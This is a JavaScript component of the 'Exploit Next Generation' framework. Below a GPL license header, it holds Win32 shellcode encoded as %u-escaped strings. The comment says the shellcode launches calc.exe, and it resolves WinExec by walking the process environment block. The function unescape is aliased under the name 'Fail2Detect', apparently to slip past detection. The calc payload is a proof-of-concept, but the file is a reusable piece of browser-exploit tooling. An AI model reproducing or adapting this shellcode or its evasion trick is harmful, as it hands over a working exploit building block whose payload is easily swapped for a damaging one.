/* 
 * $Id: asmCode.js,v 1.6 2011-03-21 17:40:17-03 nbrito Exp $
 */

/***************************************************************************
 *        ___________ _______    ________                                  *
 *        \_   _____/ \      \  /  _____/     .__         .__              *
 *         |    __)_  /   |   \/   \  ___   __|  |___   __|  |             *
 *         |        \/    |    \    \_\  \ /__    __/  /__    __/          *
 *        /_______  /\____|__  /\______  /    |__|        |__|             *
 *                \/         \/        \/                                  *
 *                                                                         *
 *                 Exploit Next Generation Methodology                     *
 *                            Release 6.00                                 *
 *                                                                         *
 *                 Copyright (c) 2004-2011 Nelson Brito                    *
 *                          All Rights Reserved                            *
 *                                                                         *
 ***************************************************************************
 * Author: Nelson Brito <nbrito@sekure.org>                                *
 *                                                                         *
 * Copyright (c) 2004-2011 Nelson Brito. All rights reserved worldwide.    *
 ***************************************************************************
 *                                                                         *
 * ENG example is free software;  you  may  redistribute and/or  modify it *
 * under the terms of the 'GNU General Public License' as published by the *
 * Free  Software  Foundation;  Version  2  with  the  clarifications  and *
 * exceptions described below.  This guarantees your right to use, modify, *
 * and redistribute this software under certain conditions. If you wish to *
 * embed ENG technology into  proprietary software,  please,  contact  the *
 * author for an alternative license (contact nbrito@sekure.org).          *
 *                                                                         *
 * This  program  is distributed in the hope that it will  be useful,  but *
 * WITHOUT  ANY  WARRANTY;    without   even   the   implied  warranty  of *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                    *
 * Please, refer to GNU General Public License v2.0 for further details at *
 * http://www.gnu.org/licenses/gpl-2.0.html,  or  in the  LICENSE document *
 * included with ENG.                                                      *
 ***************************************************************************/
var Fail2Detect = unescape;

/*
 * Win32 execute assembly component "CALC.EXE" w/o encoding.
 */
var WinExec = Fail2Detect("%ue8fc" + "%u0044" + "%u0000" + "%u458b" + "%u8b3c" + "%u057c" + "%u0178" + "%u8bef" + 
			  "%u184f" + "%u5f8b" + "%u0120" + "%u49eb" + "%u348b" + "%u018b" + "%u31ee" + "%u99c0" + 
			  "%u84ac" + "%u74c0" + "%uc107" + "%u0dca" + "%uc201" + "%uf4eb" + "%u543b" + "%u0424" +
			  "%ue575" + "%u5f8b" + "%u0124" + "%u66eb" + "%u0c8b" + "%u8b4b" + "%u1c5f" + "%ueb01" +
			  "%u1c8b" + "%u018b" + "%u89eb" + "%u245c" + "%uc304" + "%u315f" + "%u60f6" + "%u6456" +
			  "%u468b" + "%u8b30" + "%u0c40" + "%u708b" + "%uad1c" + "%u688b" + "%u8908" + "%u83f8" + 
			  "%u6ac0" + "%u6850" + "%u8af0" + "%u5f04" + "%u9868" + "%u8afe" + "%u570e" + "%ue7ff" + 
			  "%u3a43" + "%u575c" + "%u4e49" + "%u4f44" + "%u5357" + "%u735c" + "%u7379" + "%u6574" + 
			  "%u336d" + "%u5c32" + "%u6163" + "%u636c" + "%u652e" + "%u6578" + "%u4100");
